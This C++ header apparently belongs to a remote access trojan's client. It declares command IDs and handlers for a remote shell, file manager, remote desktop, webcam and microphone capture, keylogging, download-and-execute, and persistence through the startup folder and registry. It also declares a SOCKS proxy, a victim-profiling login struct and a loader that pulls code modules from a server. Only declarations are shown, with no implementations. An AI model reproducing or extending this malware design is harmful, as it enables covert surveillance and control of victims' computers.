#pragma once
#include "EventHandler.h"

#define KNEL	('K'|('N'<<8)|('E'<<16)|('L'<<24))

/*******************************EVENT ID**************************/

#define KNEL_LOGIN (0xee01)
//
#define KNEL_READY			(0x4552)

#define KNEL_POWER_REBOOT	(0xee02)
#define KNEL_POWER_SHUTDOWN	(0xee03)

#define KNEL_EDITCOMMENT	(0xee04)
#define KNEL_EDITCOMMENT_OK	(0xee05)

#define KNEL_RESTART		(0xea04)

//获取模块信息....
#define KNEL_GETMODULE_INFO	(0xea05)
#define KNEL_MODULE_INFO	(0xea07)

#define KNEL_MODULE_CHUNK_GET	(0xfa00)
#define KNEL_MODULE_CHUNK_DAT	(0xfa01)

//
#define KNEL_ERROR			(0xea08)

////
//#define KNEL_UPLOAD_MODULE_FROMDISK		(0xee08)
//#define KNEL_UPLOAD_MODULE_FORMURL		(0xee09)



#define KNEL_CMD						(0xdd01)
#define KNEL_CHAT						(0xdd02)
#define KNEL_FILEMGR					(0xdd03)
#define KNEL_DESKTOP					(0xdd04)
#define KNEL_CAMERA						(0xdd05)
#define KNEL_MICROPHONE					(0xdd06)
#define KNEL_DOWNANDEXEC				(0xdd07)
#define KNEL_EXIT						(0xdd08)
#define KNEL_KEYBD_LOG					(0xdd09)

#define KNEL_UTILS_COPYTOSTARTUP		(0xdd0a)
#define KNEL_UTILS_WRITE_REG			(0xdd0b)
#define KNEL_UTILS_OPEN_WEBPAGE			(0xdd0d)
#define KNEL_PROXY_SOCKSPROXY			(0xdd0c)
#define KNEL_PROCESSMANAGER				(0xdd0e)

/*************************************************************************/

#define MAX_MODULE_COUNT 32

typedef void(*ModuleEntry)(CIOCP *Iocp ,char* szServerAddr, unsigned short uPort, LPVOID lpParam);

class CKernel :
	public CEventHandler
{

	class Module{
	public:
		LPVOID		lpImageBase;
		ModuleEntry lpEntry;
		TCHAR		szModuleName[0x40];

		Module() :
			lpImageBase(0), lpEntry(0)
		{
			szModuleName[0] = 0;
		}

		Module(LPVOID ImageBase, ModuleEntry Entry, TCHAR *ModuleName) :
			lpImageBase(ImageBase),
			lpEntry(Entry)
		{
			lstrcpy(szModuleName, ModuleName);
		}
	};

	typedef struct LoginInfo
	{
		TCHAR PrivateIP[128];				//
		TCHAR HostName[128];
		TCHAR User[128];
		TCHAR OsName[128];
		TCHAR InstallDate[128];
		TCHAR CPU[128];
		TCHAR Disk_RAM[128];
		DWORD dwHasCamera;
		DWORD dwPing;
		TCHAR Comment[256];
	}LoginInfo;

private:

	//Module...
	Module		m_LoadedModules[MAX_MODULE_COUNT];

	volatile ULONG m_mutex;

	BOOL TryAcquire() { return !InterlockedExchange(&m_mutex,1); };
	void Release() { InterlockedExchange(&m_mutex, 0); };
	
	Module * FindLoadedModule(const TCHAR * ModuleName)
	{
		for (int i = 0; i < MAX_MODULE_COUNT; i++)
		{
			if (!lstrcmp(m_LoadedModules[i].szModuleName, ModuleName))
			{
				return &m_LoadedModules[i];
			}
		}
		return NULL;
	}

	//module upload.....
	TCHAR   m_CurrentModule[0x40];
	DWORD   m_dwModuleSize;
	DWORD   m_dwLoadedSize;
	BYTE *  m_ModuleBuffer;

	void AddModule(const BYTE * lpData, UINT Size);


	//Close event.
	HANDLE m_hEvent;

	/********************************************************************/
	UINT16 icmp_checksum(BYTE*buff, int len);
	DWORD GetPing(const char*host);
	/********************************************************************/
	void GetPrivateIP(TCHAR PrivateIP[128]);
	/********************************************************************/
	void GetPCName(TCHAR PCName[128]);
	/********************************************************************/
	void GetCurrentUser(TCHAR User[128]);
	/********************************************************************/
	void GetRAM(TCHAR RAMSize[128]);
	/********************************************************************/
	void GetDisk(TCHAR DiskSize[128]);
	/********************************************************************/
	void GetOSName(TCHAR OsName[128]);
	/********************************************************************/
	void GetCPU(TCHAR CPU[128]);
	/********************************************************************/
	DWORD HasCamera();
	/********************************************************************/
	void GetComment(TCHAR Comment[256]);
	/********************************************************************/
	void GetInstallDate(TCHAR InstallDate[128]);
	/********************************************************************/

	void GetLoginInfo(LoginInfo*pLoginInfo);
	/*********************************************************************/
	/*					EventHandler									  */
	/*********************************************************************/
	void OnReady();

	void OnEditComment(TCHAR NewComment[256]);
	void OnPower_Reboot();
	void OnPower_Shutdown();

	//void OnUploadModuleFromDisk(DWORD dwRead,char*Buffer);

	//void OnUploadModuleFromUrl(DWORD dwRead,char*Buffer);

	void OnCmd();
	void OnChat();
	void OnFileMgr();
	void OnRemoteDesktop();
	void OnCamera();
	void OnMicrophone();
	void OnRestart();
	void OnDownloadAndExec(TCHAR*szUrl);
	void OnExit();
	void OnKeyboard();
	void OnSocksProxy();
	void OnProcessManager();

	//模块传输。。。
	void OnModuleInfo(BYTE* info);
	void GetModuleChunk();
	void OnRecvModuleChunk(BYTE* Chunk);

	void OnUnilsCopyToStartupMenu();
	void OnUtilsWriteStartupReg();
	void OnUtilsOpenWebPage(TCHAR* szUrl);

	/*********************************************************************/
	//static CKernel * m_pInstance;

public:
	void GetModule(const TCHAR* ModuleName);


	virtual void OnOpen();
	virtual void OnClose();
	virtual void OnEvent(UINT32 e, BYTE* lpData, UINT Size);

	void Wait();
	CKernel(CClient * pClient);
	~CKernel();
};

